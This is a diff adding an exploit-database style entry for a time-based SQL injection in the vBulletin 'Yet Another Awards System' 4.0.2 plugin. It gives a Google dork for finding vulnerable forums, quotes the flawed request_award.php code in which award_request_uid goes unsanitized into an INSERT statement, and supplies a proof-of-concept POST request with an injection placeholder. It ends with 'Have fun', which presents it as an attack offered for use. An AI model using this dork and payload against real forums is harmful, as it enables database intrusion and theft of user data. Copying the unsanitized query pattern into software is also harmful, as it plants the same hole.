@@ -1,0 +1,33 @@
+# Exploit Title: vBulletin Yet Another Awards System 4.0.2 Time Based SQL Injection 0day
+# Google Dork: inurl:awards.php intext:"powered by vbulletin"
+# Date: 29/08/12
+# Exploit Author: Backsl@sh/Dan
+# Software Link: http://www.vbulletin.org/forum/showthread.php?t=232684
+# Version: 4.0.2+
+
+
+
+The vulnerability exists within /request_award.php.
+
+$vbulletin->input->clean_array_gpc('p', array(
+			'award_id' => TYPE_UINT,
+			//'award_request_name' => TYPE_STR,
+			//'award_request_recipient_name' => TYPE_STR,
+			'award_request_reason' => TYPE_STR,
+			'award_request_uid' => TYPE_UNIT,
+	));
+
+> $award_request_uid = $vbulletin->GPC['award_request_uid'];
+> > $db->query_write("INSERT INTO " . TABLE_PREFIX . "award_requests (award_req_uid, award_rec_uid, award_req_aid, award_req_reason) VALUES ('$award_request_uid', '$award_request_uid', '$award[award_id]', '". $db->escape_string($vbulletin->GPC['award_request_reason']) ."')");
+
+$award_request_uid is used within an insert into statement, unsanitized.
+
+
+- POC -
+http://[site].com/request_award.php
+POST: do=submit&name=award_id=[VALID REWARD ID]&award_request_reason=0&award_request_uid=0[SQL]&submit=Submit
+
+
+Thanks. Have fun.
+
+http://www.bugabuse.net/
